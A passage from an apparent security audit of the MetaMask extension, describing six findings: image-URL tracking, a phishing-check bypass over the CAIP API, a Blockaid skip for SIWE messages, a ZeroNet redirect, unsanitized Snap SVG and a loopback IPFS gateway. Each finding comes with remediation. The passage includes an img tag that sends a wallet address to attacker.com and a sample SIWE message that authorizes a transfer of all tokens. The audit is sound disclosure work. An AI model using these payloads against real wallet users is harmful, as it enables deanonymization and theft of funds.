2. MetaMask opens the confirmation dialog and renders `<img src="https://attacker.com/track?wallet=0x1234&...">`.
3. The browser sends an HTTP GET **before the user clicks anything.**
4. The attacker's server logs the user's IP address, User-Agent (browser + OS
   version), and the wallet address embedded in the query string.

#### Mitigating Factors (documented honestly)

1. **Provider access required:** The dApp must have already obtained wallet
   provider access (user connected the site). A random page cannot trigger this
   without a prior connection.
2. **User sees a dialog:** The MetaMask confirmation dialog is visible to the
   user. The image fetch has already occurred by the time the dialog appears,
   but the user can still reject the token watch.
3. **IP/fingerprint leak, not data exfiltration:** The attacker learns the
   user's IP address, User-Agent, and timing. Private keys, seed phrase, and
   token balances are not exposed.
4. **MetaMask extension ID is publicly known:** The Chrome Web Store ID
   (`nkbihfbeogaeaoehlefnkodbefgpgknn`) is public. No additional fingerprinting
   value comes from the extension ID itself.

#### Impact

- **IP address correlation:** A dApp can correlate a wallet address (obtained
  from `eth_requestAccounts`) with the user's IP address without any additional
  user action beyond the dialog appearing.
- **Browser fingerprinting:** The HTTP GET includes the User-Agent header,
  enabling browser/OS version fingerprinting.
- **Timing correlation:** The request fires at a known point in the user's
  workflow, enabling timing-based deanonymization against blockchain analytics.
- **`javascript:` URI consideration:** While React sanitizes attribute values
  for event handlers, the `src` attribute of `<img>` is passed to the browser
  directly. Browsers do not execute `javascript:` in `<img src>`, but other
  schemes (`file:`, `data:`) may have unintended effects in some browser versions.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln7_watchasset_tracking.sh
```

The script:
1. Reads both MV2 and MV3 manifests and confirms no `img-src` CSP directive.
2. Greps the three affected files at the specified lines to show the code path.
3. Confirms `#validateUnifiedWatchAssetRequest` does not validate `image`/`iconUrl`.
4. Confirms no URL validation functions (`sanitizeUrl`, `validateImageUrl`,
   `isValidImageUrl`, `DOMPurify`, `isValidUrl`) exist in the code path.
5. Runs a Node.js simulation reproducing the `asset.image ?? asset.iconUrl`
   storage logic, showing five malicious URL types all pass without rejection.

#### Remediation

1. **Add `img-src` to the extension CSP:**
   ```
   script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; frame-ancestors 'none';
   font-src 'self'; img-src 'self' data: https://static.metafi.codefi.network/;
   ```
   This would block arbitrary external image loads at the browser level.

2. **Validate image URLs before storage:** In `#validateUnifiedWatchAssetRequest`
   (metamask-controller.js lines 6716-6756), add URL validation:
   - Reject non-`https:` schemes (block `file:`, `data:`, `javascript:`, `http:`).
   - Apply a domain allowlist or proxy all token images through a MetaMask-controlled CDN.
   - Example: reject any URL that does not match `^https://static\.metafi\.codefi\.network/`.

3. **Defer image loading until after approval:** Render a placeholder icon in
   the confirmation dialog; load the actual image URL only after the user clicks
   Approve.

---

### VULN-8: Phishing Detection Bypass via CAIP Multichain API

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-8                                                                                 |
| Severity       | **High**                                                                               |
| CVSS 3.1       | **8.1** — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N                                        |
| Affected Files | `app/scripts/metamask-controller.js` (lines 6922-6974, 6984-7000)                     |
|                | `app/scripts/background.js` (lines 1886-1896, 1900-1921)                              |
|                | `app/manifest/v3/chrome.json` (`externally_connectable`)                              |
|                | `app/manifest/v2/chrome.json` (`externally_connectable`)                              |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln8_caip_phishing_bypass.sh`                                               |

#### Description

MetaMask maintains two separate code paths for untrusted external connections:

1. **EIP-1193 path** — `setupUntrustedCommunicationEip1193()` (lines 6922-6974) which
   includes a phishing check before establishing a provider connection.
2. **CAIP multichain path** — `setupUntrustedCommunicationCaip()` (lines 6984-7000)
   which has **no phishing check** and immediately calls `setupProviderConnectionCaip()`.

The EIP-1193 phishing check (`setupUntrustedCommunicationEip1193`, lines 6927-6946):

```javascript
if (sender.url) {
  if (this.onboardingController.state.completedOnboarding) {
    if (this.preferencesController.state.usePhishDetect) {
      const { hostname } = new URL(sender.url);
      this.phishingController.maybeUpdateState();
      const phishingTestResponse = this.phishingController.test(sender.url);
      if (phishingTestResponse?.result) {
        this.sendPhishingWarning(connectionStream, hostname);
        this.metaMetricsController.trackEvent({ event: MetaMetricsEventName.PhishingPageDisplayed, ... });
        return;  // Early return — connection blocked
      }
    }
  }
}
```

The CAIP path (`setupUntrustedCommunicationCaip`, lines 6984-7000) contains none of these keywords. It has zero references to `phishingController`, `usePhishDetect`, `sendPhishingWarning`, or `PhishingPageDisplayed`.

#### Platform-Specific Attack Paths

**Chrome MV3** (`app/manifest/v3/chrome.json`):

```json
"externally_connectable": {
  "matches": ["http://*/*", "https://*/*"],
  "ids": ["*"]
}
```

Any HTTP or HTTPS website on any domain can call `chrome.runtime.connect()` to
MetaMask. The `connectExternallyConnectable` handler (background.js:1900-1921)
routes dApp connections (where `sender.id` is absent) directly to
`connectCaipMultichain()` — the path with no phishing check. A phishing site on
any arbitrary domain can use the CAIP multichain API to request account access and
sign transactions without triggering MetaMask's phishing warning.

**Firefox MV2** (`app/manifest/v2/chrome.json`):

```json
"externally_connectable": {
  "matches": ["https://metamask.io/*"]
}
```

The `externally_connectable` is restricted to `metamask.io` in MV2. However, the
`window.postMessage` path (background.js lines 1886-1896) opens a CAIP multichain
stream **independently** of the EIP-1193 connection:

```javascript
connectEip1193(portStream, remotePort.sender);  // Has phishing check

// for firefox and manifest v2 (non production webpack builds)
if (isFirefox || !isManifestV3) {
  const mux = setupMultiplex(portStream);
  mux.ignoreStream(METAMASK_EIP_1193_PROVIDER);
  connectCaipMultichain(
    mux.createStream(METAMASK_CAIP_MULTICHAIN_PROVIDER),
    remotePort.sender,
  );  // NO phishing check — called independently
}
```

Even when `setupUntrustedCommunicationEip1193` detects a phishing site and returns
early, `connectCaipMultichain` is called afterward on the same `portStream`. The
phishing check does **not** prevent the CAIP stream from opening on Firefox/MV2.

#### Attack Vector

**Chrome MV3 (any phishing site):**
1. Phishing site calls `chrome.runtime.connect({ name: 'metamask-provider' })`.
2. `connectExternallyConnectable` routes the call to `connectCaipMultichain()`.
3. `setupUntrustedCommunicationCaip()` — no phishing check — proceeds.
4. Phishing site requests accounts, signs transactions, no warning shown.

**Firefox MV2 (phishing site page that loads MetaMask inpage):**
1. Phishing page loads the MetaMask inpage script (via injected content script).
2. `connectWindowPostMessage` calls both `connectEip1193` and `connectCaipMultichain`.
3. Even if the EIP-1193 phishing check fires (warning shown), `connectCaipMultichain`
   still opens — the phishing site can use the CAIP channel.

#### Mitigating Factors (documented honestly)

1. **EIP-1193 path is still protected:** Most existing dApps use the EIP-1193 API.
   The phishing check on the EIP-1193 path remains intact. Only dApps that
   specifically use the CAIP multichain API (a newer interface) bypass detection.
2. **CAIP API adoption:** The CAIP multichain API is relatively new. Current phishing
   kits overwhelmingly target the EIP-1193 `window.ethereum` interface. This reduces
   immediate real-world exploitation, though the attack surface will grow as CAIP
   adoption increases.
3. **User interaction required:** The user must visit the phishing site and interact
   with a MetaMask prompt (UI:R in the CVSS vector).
4. **Firefox/MV2 nuance:** On Firefox/MV2, the EIP-1193 phishing warning IS shown.
   The bypass is that the CAIP channel opens anyway — a phishing site that knows this
   path could target CAIP-aware wallet actions while the warning is being displayed.

#### Impact

- **Phishing site uses CAIP API to sign transactions:** An attacker can construct a
  phishing page that uses the CAIP multichain API to request `wallet_sign`,
  `wallet_switchEthereumChain`, or other methods — receiving responses even while
  MetaMask's phishing detector has flagged the site.
- **Full account and signing access:** `setupUntrustedCommunicationCaip()` calls
  `setupProviderConnectionCaip()` which establishes a full CAIP provider connection
  — giving access to account enumeration and transaction signing methods.
- **No security warning displayed:** On Chrome MV3, the user receives no phishing
  warning before the CAIP connection is established.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln8_caip_phishing_bypass.sh
```

The script:
1. Extracts `setupUntrustedCommunicationEip1193` (lines 6922-6974) and confirms
   phishing keywords (`phishingController`, `usePhishDetect`, `sendPhishingWarning`,
   `PhishingPageDisplayed`) are present.
2. Extracts `setupUntrustedCommunicationCaip` (lines 6984-7000) and confirms ZERO
   phishing check references.
3. Shows the background.js routing: `connectExternallyConnectable` (dApp path) goes
   to `connectCaipMultichain` without phishing check; `connectEip1193` goes to the
   path with the phishing check.
4. Reads both manifests and documents `externally_connectable` patterns.
5. Runs a Node.js simulation that performs side-by-side regex analysis of both methods,
   verifies the routing logic from background.js, and documents platform-specific paths.

#### Remediation

1. **Add phishing detection to `setupUntrustedCommunicationCaip()`** mirroring the
   check in `setupUntrustedCommunicationEip1193()`:
   ```javascript
   setupUntrustedCommunicationCaip({ connectionStream, sender, subjectType }) {
     if (sender.url && this.onboardingController.state.completedOnboarding) {
       if (this.preferencesController.state.usePhishDetect) {
         const phishingTestResponse = this.phishingController.test(sender.url);
         if (phishingTestResponse?.result) {
           this.sendPhishingWarning(connectionStream, new URL(sender.url).hostname);
           return;
         }
       }
     }
     // ... existing code
   }
   ```

2. **Extract phishing check into a shared helper method** to prevent future drift
   between `setupUntrustedCommunicationEip1193` and `setupUntrustedCommunicationCaip`.

3. **Add integration tests** verifying phishing detection fires on both the EIP-1193
   and CAIP communication paths.

---

### VULN-9: Blockaid/PPOM Security Analysis Bypass via SIWE Detection

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-9                                                                                 |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **6.5** — AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N                                        |
| Affected Files | `app/scripts/lib/ppom/ppom-middleware.ts` (lines 101-106)                             |
|                | `shared/constants/transaction.ts` (lines 14-20)                                       |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln9_ppom_siwe_bypass.sh`                                                   |

#### Description

`ppom-middleware.ts` creates the middleware that runs Blockaid/PPOM security analysis
on all signing requests. For `personal_sign` and other methods in `CONFIRMATION_METHODS`,
the middleware calls `validateRequestWithPPOM()` which triggers Blockaid's security
scanning and warning UI.

However, lines 101-106 contain an early return for SIWE (Sign-In With Ethereum, EIP-4361)
messages that bypasses PPOM security analysis entirely:

```typescript
// ppom-middleware.ts lines 101-106
const data = req.params[0];
if (typeof data === 'string') {
  const { isSIWEMessage } = detectSIWE({ data });
  if (isSIWEMessage) {
    return;  // <-- EARLY RETURN: validateRequestWithPPOM never called
  }
}
```

The `detectSIWE` function (imported from `@metamask/controller-utils`) detects EIP-4361
format messages. When it returns `isSIWEMessage: true`, the middleware skips all PPOM
analysis for that request.

A malicious dApp can craft a SIWE-formatted message with a legitimate EIP-4361 structure
but include a malicious **statement field** — the free-text section that the user is
supposed to read. For example:

```
legitimate-app.com wants you to sign in with your Ethereum account:
0x935e73Edb9ff52e23bac7f7e043A1ECd06D05477

I authorize transfer of ALL tokens from my wallet to address 0xDeAdBeEf1234567890.
This is a required security verification.

URI: https://legitimate-app.com
Version: 1
Chain ID: 1
Nonce: a4b8c2d9e1f3
Issued At: 2026-05-22T12:00:00.000Z
```

This message matches EIP-4361 format (triggering `isSIWEMessage: true`), but the
statement requests a dangerous action. PPOM/Blockaid is never invoked — the user sees
a SIWE sign-in dialog with no security warning.

#### Code Context

`CONFIRMATION_METHODS` (ppom-middleware.ts lines 33-37) includes `personal_sign` via
the spread of `SIGNING_METHODS` from `shared/constants/transaction.ts` (lines 14-20):

```typescript
export const SIGNING_METHODS = Object.freeze([
  'eth_signTypedData', 'eth_signTypedData_v1',
  'eth_signTypedData_v3', 'eth_signTypedData_v4',
  'personal_sign',
]);
```

The existing test suite (`ppom-middleware.test.ts` lines 237-263) explicitly tests and
verifies this bypass behavior: when `detectSIWE` returns `{ isSIWEMessage: true }`,
`validateRequestWithPPOM` is expected NOT to be called. This confirms the bypass is
an intentional design choice — but one that creates a security gap.

#### Caveats (documented honestly)

1. **`detectSIWE` is from `@metamask/controller-utils` (npm package, not decompiled).**
   The exact parsing logic was not verified. If `detectSIWE` performs content-based
   analysis of the statement field (not just format-based structure matching), this
   bypass might not work in practice. The finding assumes format-based EIP-4361
   detection, which is the standard approach for this function class.

2. **The malicious statement is visible to the user.** MetaMask's SIWE sign-in UI
   displays the full message content including the statement field. An attentive user
   could read and notice `"I authorize transfer of ALL tokens..."` before clicking Sign.
   The vulnerability is in bypassing the **automated** security analysis, not in hiding
   the message from the user.

3. **Possibly intentional design.** The bypass may reflect a deliberate design
   decision: SIWE authentication messages are typically low-risk login operations where
   Blockaid analysis adds limited value, and false positives could disrupt legitimate
   SIWE logins. However, skipping ALL security analysis for any EIP-4361-structured
   message creates a bypass vector for malicious content in the statement field.

#### Attack Vector

1. Attacker constructs a `personal_sign` request using a hex-encoded EIP-4361 message
   with a malicious statement field (e.g., authorizing a token transfer or approving
   a dApp operation).
2. User's wallet receives the `personal_sign` request.
3. `ppom-middleware.ts` decodes the message, calls `detectSIWE()` which returns
   `{ isSIWEMessage: true }` (EIP-4361 structure matches).
4. Middleware returns early — `validateRequestWithPPOM()` is not called.
5. No Blockaid security alert is generated or displayed.
6. MetaMask shows a SIWE sign-in dialog. The malicious statement is displayed but
   no automated security warning accompanies it.

#### Impact

- **Blockaid analysis bypass:** Any EIP-4361-formatted `personal_sign` request skips
  Blockaid analysis, which could otherwise detect malicious signing patterns (addresses
  matching phishing wallets, suspicious domain/statement combinations, etc.).
- **Social engineering:** A malicious statement like `"I authorize delegation of wallet
  0xAttacker as operator"` could trick a distracted user into signing a harmful message
  while believing it is a routine login.
- **Weakened defense-in-depth:** The bypass undermines MetaMask's layered security
  model where PPOM/Blockaid acts as an independent safety net for signing requests.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln9_ppom_siwe_bypass.sh
```

The script:
1. Confirms the bypass pattern (`detectSIWE` -> `isSIWEMessage` -> early `return`) in
   `ppom-middleware.ts` lines 101-106.
2. Confirms `personal_sign` is in `SIGNING_METHODS` (transaction.ts lines 14-20) and
   that `CONFIRMATION_METHODS` spreads `SIGNING_METHODS`.
3. Shows the `detectSIWE` import from `@metamask/controller-utils`.
4. Shows the existing test (ppom-middleware.test.ts lines 237-263) that explicitly
   verifies `validateRequestWithPPOM` is not called for SIWE messages.
5. Runs a Node.js simulation that constructs a valid EIP-4361 message with a malicious
   statement, hex-encodes it as a `personal_sign` parameter, and walks through the
   middleware logic showing the early return.

#### Remediation

1. **Do not skip PPOM analysis for SIWE messages.** Instead, pass SIWE context to
   PPOM so it can apply SIWE-specific analysis rules (validate the URI matches the
   dApp's origin, check the statement for suspicious authorization language, verify
   the domain matches the signing domain).

2. **If skipping is intentional for legitimate SIWE login flows,** perform at minimum
   domain validation before bypassing: only skip PPOM if the SIWE URI domain matches
   the request origin exactly.

3. **Add a Blockaid-specific SIWE analysis rule** that checks the statement field for
   suspicious content (authorization language, addresses, transfer keywords) rather
   than passing all SIWE messages through without any analysis.

---

### VULN-10: ZeroNet ENS Contenthash Open Redirect to Localhost

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-10                                                                                |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **4.7** — AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N                                        |
| CWE            | CWE-601 (URL Redirection to Untrusted Site / Open Redirect)                            |
| Affected Files | `app/scripts/lib/ens-ipfs/setup.js` (lines 112-115, 140)                              |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln10_ens_zeronet_ssrf.sh`                                                  |

#### Description

The ENS resolution code in `app/scripts/lib/ens-ipfs/setup.js` handles the `zeronet`
contenthash codec by constructing a URL to `http://127.0.0.1:43110/` and redirecting
the user's tab via `browser.tabs.update()`. This is a **client-side open redirect**
(CWE-601) — the user's browser navigates directly to the localhost URL. This is NOT
Server-Side Request Forgery (CWE-918), which would require a server making requests on
behalf of the attacker.

```javascript
// setup.js lines 112-115
} else if (type === 'zeronet') {
  url = `http://127.0.0.1:43110/${hash}${pathname}${search || ''}${
    fragment || ''
  }`;
}
```

The `hash` value is decoded from the on-chain ENS contenthash (attacker-controlled
when an attacker registers an ENS name). The `pathname`, `search`, and `fragment`
components are forwarded from the user's typed URL to the localhost endpoint. No
validation of the hash or path components against loopback or private IP addresses
exists before `browser.tabs.update(tabId, { url })` is called (line 140).

The `finally`-block URL guard (lines 135-141) checks only whether `url` is truthy and
whether `useAddressBarEnsResolution` is enabled — it does NOT validate the destination
network address against loopback or private ranges.

> **Important caveat:** The redirect to `http://127.0.0.1:43110/` is an **intentional
> design decision** — ZeroNet runs on localhost:43110 by definition. See CHANGELOG:
> "Add support for ZeroNet (#7038)". The finding concerns the lack of validation on the
> `hash` and path components forwarded to the localhost endpoint, not the redirect itself.

#### Code Path

```
webRequestDidFail
  -> attemptResolve
  -> resolveEnsToIpfsContentId  -- returns { type: 'zeronet', hash }
  -> setup.js:112-115           -- url = `http://127.0.0.1:43110/${hash}${pathname}...`
  -> finally block (lines 135-141)
  -> browser.tabs.update(tabId, { url })  -- no loopback/private guard
```

#### Attack Vector

1. Attacker registers an ENS name (e.g., `evil.eth`) with a `zeronet` contenthash
   encoding an arbitrary hash value.
2. User has MetaMask installed with "ENS address bar resolution" (enabled by default).
3. User types `http://evil.eth/admin?debug=true` in the address bar.
4. MetaMask resolves the contenthash, extracts `type=zeronet` and the attacker's hash.
5. setup.js constructs: `http://127.0.0.1:43110/{attacker-hash}/admin?debug=true`
6. `browser.tabs.update()` redirects the user's tab to this localhost URL.
7. The user's browser sends a request to `http://127.0.0.1:43110/{hash}/admin?debug=true`.

#### Impact

- **Requests reach localhost:43110:** If the user is running ZeroNet, the attacker can
  navigate them to specific pages/endpoints within ZeroNet using the attacker-controlled
  hash as the site identifier.
- **User-supplied path forwarded:** The `pathname`, `search`, and `fragment` from the
  user's typed URL are forwarded to the localhost endpoint without sanitization, enabling
  potential path traversal if the ZeroNet server is vulnerable.
- **User expectation mismatch:** A user visiting `http://evil.eth/admin` does not expect
  to be redirected to a localhost service.

#### Mitigating Factors (documented honestly)

1. **Enabled by default:** ENS address bar resolution is enabled by default
   (`useAddressBarEnsResolution: true` in `preferences-controller.ts:185`). The user
   must navigate to a `.eth` domain in the address bar for this code path to trigger.
2. **Fixed port:** Only port 43110 is targeted (ZeroNet default). No other local ports
   are reachable via this path.
3. **Visible redirect:** The redirect is visible in the browser address bar — the user
   can see the resulting `http://127.0.0.1:43110/` URL.
4. **Niche protocol:** ZeroNet is a relatively niche protocol; most users do not run
   a ZeroNet daemon on localhost:43110.
5. **Intentional design:** The ZeroNet redirect to `localhost:43110` is an intentional
   design decision (CHANGELOG: "Add support for ZeroNet #7038"). The finding concerns
   the lack of validation on the `hash` and path components forwarded to the localhost
   endpoint, not the redirect itself.

#### Reproduction Steps

```bash
./setup.sh
./exploits/vuln10_ens_zeronet_ssrf.sh
```

The script:
1. Shows setup.js lines 112-115 confirming the localhost URL construction.
2. Confirms no IP validation functions (`isPrivate`, `isLoopback`, etc.) exist in setup.js.
3. Shows the finally-block URL guard (lines 135-141) checks only `useAddressBarEnsResolution`
   and URL equality — no loopback/private range guard.
4. Confirms `browser.tabs.update(tabId, { url })` at line 140 is called with no address guard.
5. Shows the swarm/onion paths (lines 106-111) for comparison.
6. Runs a Node.js simulation showing multiple attack payloads, all resulting in
   `http://127.0.0.1:43110/` URLs.

#### Remediation

1. **Validate constructed URLs against loopback/private ranges** before calling
   `browser.tabs.update()`. Reject any `url` that resolves to `127.0.0.0/8`,
   `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `::1`, or `localhost`.
2. **Since ZeroNet always targets `127.0.0.1:43110`**, validate that the `hash`
   component does not contain path traversal sequences (`../`, `%2e%2e`, encoded
   variants) before constructing the URL.
3. **Strip or restrict user-supplied path components** (`pathname`, `search`,
   `fragment`) when redirecting to localhost services, to prevent forwarding
   attacker-influenced URL components to the local endpoint.

---

### VULN-11: Unsanitized SVG in Snap UI Image Component (Defense-in-Depth XSS)

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-11                                                                                |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **4.4** — AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N                                        |
| Affected Files | `ui/components/app/snaps/snap-ui-image/snap-ui-image.tsx` (lines 19-32)               |
|                | `ui/components/app/snaps/snap-ui-renderer/components/image.ts` (line 23)              |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln11_snap_svg_injection.sh`                                                |

#### Description

The `SnapUIImage` component (`snap-ui-image.tsx` lines 19-21) embeds Snap-provided SVG
content as a `data:image/svg+xml` data URI in an `<img>` tag without any sanitization:

```typescript
// snap-ui-image.tsx lines 19-21
const src = isValidUrl(value)
  ? value
  : `data:image/svg+xml;utf8,${encodeURIComponent(value)}`;
```

The `value` prop receives SVG content directly from the Snap manifest via `image.ts`
(line 23: `value: element.props.src`). `encodeURIComponent` does not strip or filter
HTML/SVG tags — it merely percent-encodes characters. Malicious SVG tags (`<script>`,
`onload` handlers, `<foreignObject>` with XHTML content) survive the encoding intact
and are present in the embedded `<img>` src.

The codebase already uses DOMPurify in `feature-announcement.tsx` for HTML content
sanitization, demonstrating the library is available. Its absence from `snap-ui-image.tsx`
is an inconsistency in the defense-in-depth posture.

#### Code Flow

```
Snap manifest Image element (src = attacker SVG)
  -> image.ts UIComponentFactory (line 23: value: element.props.src)
  -> SnapUIImage.props.value (no sanitization in mapper)
  -> snap-ui-image.tsx:19-21
       isValidUrl(value) -> false (SVG content is not a URL)
       src = `data:image/svg+xml;utf8,${encodeURIComponent(value)}`
  -> <img src={src}> (malicious SVG embedded, no content filtering applied)
```

#### Mitigating Factors (documented honestly)

1. **`<img>` context blocks SVG script execution** in all modern browsers. SVG loaded
   via `<img src>` is treated as an image resource — `<script>` tags and event handlers
   (including `onload`) do not execute. This is the primary mitigating control.
2. **CSP `script-src 'self'`** blocks inline script execution even if a rendering
   context change were to occur.
3. **Snaps go through an approval process** before installation. A malicious Snap
   providing harmful SVG must first be installed by the user.
4. **Defense-in-depth gap only:** The vulnerability is NOT currently exploitable via
   the `<img>` rendering context. Exploitation requires a context change.
5. **Execution would require context change** to `<object>`, `<embed>`, `<iframe src
   data:...>`, or `dangerouslySetInnerHTML` in addition to a malicious Snap.
6. **Snaps SDK may perform upstream validation:** SVG content validation may occur
   within the `@metamask/snaps-sdk` or Snaps execution environment (not decompiled
   for this audit). Secondary enforcement analogous to VULN-6's `@metamask/snaps-rpc-methods`
   layer is possible but unverified.

#### Impact

If the rendering context were to change from `<img>` to an active renderer:
- **Extension-privileged XSS:** Unsanitized SVG would execute JavaScript in the
  extension's privileged context, which has access to MetaMask background APIs,
  wallet state, and sensitive cryptographic material.
- **Snap isolation escape:** A malicious Snap could leverage the XSS to escape its
  sandboxed execution environment and interact directly with the MetaMask background.

#### Reproduction Steps

```bash
./setup.sh
./exploits/vuln11_snap_svg_injection.sh
```

The script:
1. Shows `snap-ui-image.tsx` lines 19-32 confirming SVG embedding without sanitization.
2. Confirms `image.ts` line 23 maps `element.props.src` -> `SnapUIImage.props.value`.
3. Greps `snap-ui-image.tsx` for sanitization functions and confirms zero matches.
4. Shows DOMPurify IS used in `feature-announcement.tsx` (demonstrating inconsistency).
5. Confirms neither MV2 nor MV3 CSP has an `img-src` directive.
6. Runs a Node.js simulation showing four malicious SVG payloads all embedded without
   content filtering, with decoded URIs confirming malicious tags survive intact.

#### Remediation

1. **Apply DOMPurify sanitization** (already in the codebase) before embedding SVG:
   ```typescript
   import DOMPurify from 'dompurify';
   const cleanValue = DOMPurify.sanitize(value, { USE_PROFILES: { svg: true } });
   const src = isValidUrl(value)
     ? value
     : `data:image/svg+xml;utf8,${encodeURIComponent(cleanValue)}`;
   ```

2. **Restrict to a safe SVG element allowlist:** Reject `<foreignObject>`, `<script>`,
   `<animate>`, `<use>` (with external `href`), and event handler attributes from
   Snap-provided SVG content.

3. **Add automated tests** verifying that DOMPurify strips script tags, `onload`
   handlers, and `foreignObject` XHTML content from Snap-provided SVG.

---

### VULN-12: IPFS Gateway Accepts Loopback/Private Network Addresses

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-12                                                                                |
| Severity       | **Low**                                                                                |
| CVSS 3.1       | **3.1** — AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N                                        |
| Affected Files | `ui/pages/settings/privacy-tab/ipfs-gateway-item.tsx` (lines 47-61)                   |
|                | `app/scripts/controllers/preferences-controller.ts` (lines 883-888)                   |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln12_ipfs_gateway_loopback.sh`                                             |

#### Description

The IPFS gateway configuration in `ipfs-gateway-item.tsx` validates user input with
three checks only (lines 40-61):

```typescript
// ipfs-gateway-item.tsx lines 40-61
const handleIpfsGatewayChange = (url: string) => {
  if (!url.length) {          // Check 1: non-empty
    setIpfsGatewayError(t('invalidIpfsGateway'));
    return;
  }
  const validUrl = addUrlProtocolPrefix(url);  // Check 2: URL prefix
  if (!validUrl) { ... return; }

  const urlObj = new URL(validUrl);
  if (urlObj.host === IPFS_FORBIDDEN_GATEWAY) {  // Check 3: NOT gateway.ipfs.io
    setIpfsGatewayError(t('forbiddenIpfsGateway'));
    return;
  }
  dispatch(setIpfsGateway(urlObj.host));  // Stored verbatim
```

`IPFS_FORBIDDEN_GATEWAY` is defined as `'gateway.ipfs.io'` in
`shared/constants/network.ts` (line 1523) — it blocks only one specific deprecated
gateway. No check against loopback (`127.0.0.0/8`), private ranges (`10.0.0.0/8`,
`172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), or IPv6 loopback
(`::1`) exists.

`setIpfsGateway()` in `preferences-controller.ts` (lines 883-888) stores the domain
with zero additional validation: `state.ipfsGateway = domain`.

The stored gateway domain is then used in `setup.js` (lines 91-94) to construct IPFS
resolution URLs that MetaMask fetches via a HEAD request:

```javascript
// setup.js lines 91-94
const resolvedUrl = `https://${hash}.${type.slice(0,4)}.${ipfsGateway}${pathname}...`;
// ...
const response = await fetchWithTimeout(resolvedUrl, { method: 'HEAD' });
```

> **Practical exploitability note:** Due to the HTTPS requirement and subdomain DNS
> resolution behavior, this finding is primarily a code-quality concern rather than a
> practically exploitable vulnerability in typical configurations. The constructed URL
> uses `https://`, and most localhost services (e.g., IPFS API on port 5001) do not
> support TLS. Additionally, subdomain DNS resolution for `{cid}.ipfs.127.0.0.1` returns
> NXDOMAIN in typical network configurations.

#### Code Path

```
UI input -> handleIpfsGatewayChange
  -> addUrlProtocolPrefix (prepend https:// if missing)
  -> new URL(validUrl).host
  -> check host !== 'gateway.ipfs.io' (ONLY blocked value)
  -> dispatch(setIpfsGateway(urlObj.host))
  -> preferences-controller.ts: state.ipfsGateway = domain (no validation)
  -> setup.js:91-94: https://{cid}.ipfs.{ipfsGateway}{path} (HEAD request)
```

#### Attack Vector

1. Social engineering: attacker's guide or website instructs the user to set the IPFS
   gateway to `127.0.0.1:5001` (described as "local IPFS node for faster resolution")
   or `192.168.1.1` (router admin interface).
2. User navigates to Settings > Security & Privacy > IPFS Gateway and enters the value.
3. Validation passes all checks (non-empty, URL-parseable, host ≠ `gateway.ipfs.io`).
4. `preferences.ipfsGateway = '127.0.0.1:5001'` is stored.
5. User visits any ENS `.eth` domain with an IPFS contenthash.
6. MetaMask constructs: `https://{cid}.ipfs.127.0.0.1:5001{path}`.
7. MetaMask sends a HEAD request to this constructed URL.

#### Mitigating Factors (documented honestly)

1. **Requires social engineering:** The user must manually change the IPFS gateway
   setting. This is a non-default, power-user configuration.
2. **IPFS gateway is a power-user feature:** Most MetaMask users never change this
   setting from its default.
3. **HTTPS requirement:** The constructed URL uses `https://`. Localhost services
   without TLS (e.g., the IPFS API on port 5001, which serves HTTP only) will reject
   the TLS negotiation — the request does not reach the internal service in practice.
4. **Subdomain DNS failure:** The URL format is `https://{cid}.ipfs.127.0.0.1:5001/`.
   Standard DNS resolvers do not resolve `{cid}.ipfs.127.0.0.1` (this is not a valid
   subdomain of the loopback address). DNS lookup returns NXDOMAIN in typical
   configurations.
5. **Code-quality concern in practice:** These combined factors make this finding
   primarily a validation gap (code quality) rather than a practically exploitable
   SSRF in standard configurations.

#### Impact

If an attacker also controls the victim's DNS (e.g., via malicious DNS server on the
local network) or custom `/etc/hosts` entries, the HEAD requests could reach internal
services. Repeated IPFS/ENS resolutions would send requests to the configured internal
endpoint for every `.eth` domain visit, potentially exfiltrating request timing data.

#### Reproduction Steps

```bash
./setup.sh
./exploits/vuln12_ipfs_gateway_loopback.sh
```

The script:
1. Shows `handleIpfsGatewayChange` (lines 40-61) — only checks non-empty, URL syntax,
   and `host !== 'gateway.ipfs.io'`.
2. Shows `setIpfsGateway()` (lines 883-888) — direct `state.ipfsGateway = domain`.
3. Shows `IPFS_FORBIDDEN_GATEWAY = 'gateway.ipfs.io'` (only one gateway blocked).
4. Shows setup.js lines 91-94 — gateway used in IPFS URL construction + HEAD request.
5. Runs a Node.js simulation testing seven loopback/private inputs, all of which pass
   validation, and shows the resulting IPFS resolution URL for each.

#### Remediation

1. **Add loopback/private range validation** in `handleIpfsGatewayChange`:
   Reject hosts that resolve to `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`,
   `192.168.0.0/16`, `169.254.0.0/16`, `::1`, or `localhost`.

2. **Add equivalent validation in `setIpfsGateway()`** in `preferences-controller.ts`
   as a defense-in-depth server-side check, independent of UI validation.

3. **Verify gateway domains resolve to public IPs** before use in ENS resolution.
   Consider performing a DNS pre-check and rejecting resolution if the gateway host
   resolves to a private or loopback address.

---

## Appendix: Exploit Files

| File                                         | Purpose                            |
|----------------------------------------------|------------------------------------|
